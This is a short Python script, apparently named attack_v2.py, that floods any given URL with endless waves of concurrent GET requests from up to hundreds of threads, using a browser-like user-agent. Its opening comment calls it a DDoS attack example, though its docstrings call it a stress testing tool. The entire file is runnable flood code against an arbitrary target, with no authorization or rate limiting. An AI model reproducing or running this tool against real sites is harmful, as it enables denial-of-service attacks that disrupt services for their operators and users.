# example use to attack ddos attack
# This script is a simple HTTP stress testing tool that sends a specified number of requests to a target URL using multiple threads.
# It can be used for testing the performance of web servers or applications under load. 
# python attack_v2.py https://example.com -r 1000 -w 200 

# Installed packages:
# pip install colorama
# pip install requests

import argparse
import concurrent.futures
import sys
import time
import requests
from colorama import init, Fore, Style

# Initialize colorama for cross-platform colored text
init(autoreset=True)

def create_session():
    """Creates a requests.Session with a standard user-agent header."""
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    })
    return session

def send_request(session, url):
    """Sends a single GET request using the provided session."""
    try:
        with session.get(url, timeout=10) as response:
            return response.status_code
    except requests.exceptions.RequestException:
        return None

def run_test_wave(url, num_requests, max_workers):
    """Sends a wave of concurrent requests and prints the results."""
    successful_requests = 0
    failed_requests = 0

    print(f"--- Sending {num_requests} requests with {max_workers} workers ---")

    with create_session() as session:
        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
            # Prepare all the jobs
            future_to_url = {executor.submit(send_request, session, url): i for i in range(num_requests)}

            # Process results as they complete
            for future in concurrent.futures.as_completed(future_to_url):
                status = future.result()
                if status and 200 <= status < 300:
                    successful_requests += 1
                else:
                    failed_requests += 1

                # Dynamic progress display
                success_color = Fore.GREEN if successful_requests > 0 else Fore.WHITE
                fail_color = Fore.RED if failed_requests > 0 else Fore.WHITE
                print(
                    f"\rProgress: {success_color}{successful_requests} Successful{Style.RESET_ALL} | "
                    f"{fail_color}{failed_requests} Failed{Style.RESET_ALL}",
                    end="",
                    flush=True
                )

    print("\n--- Wave complete ---\n")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="A simple, continuous HTTP stress testing tool.",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument('url', type=str, help='The target URL to test.')
    parser.add_argument(
        '-r', '--requests', type=int, default=500,
        help='Number of requests to send per wave (default: 500).'
    )
    parser.add_argument(
        '-w', '--workers', type=int, default=100,
        help='Number of concurrent workers/threads (default: 100).'
    )
    args = parser.parse_args()

    print(f"{Fore.CYAN}Target URL:{Style.RESET_ALL} {args.url}")
    print(f"{Fore.CYAN}Requests per Wave:{Style.RESET_ALL} {args.requests}")
    print(f"{Fore.CYAN}Concurrent Workers:{Style.RESET_ALL} {args.workers}\n")
    print(f"{Fore.YELLOW}Press CTRL+C to stop the test.{Style.RESET_ALL}")
    time.sleep(2)

    try:
        while True:
            run_test_wave(args.url, args.requests, args.workers)
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n\n{Fore.RED}🛑 Test stopped by user.{Style.RESET_ALL}")
        sys.exit(0)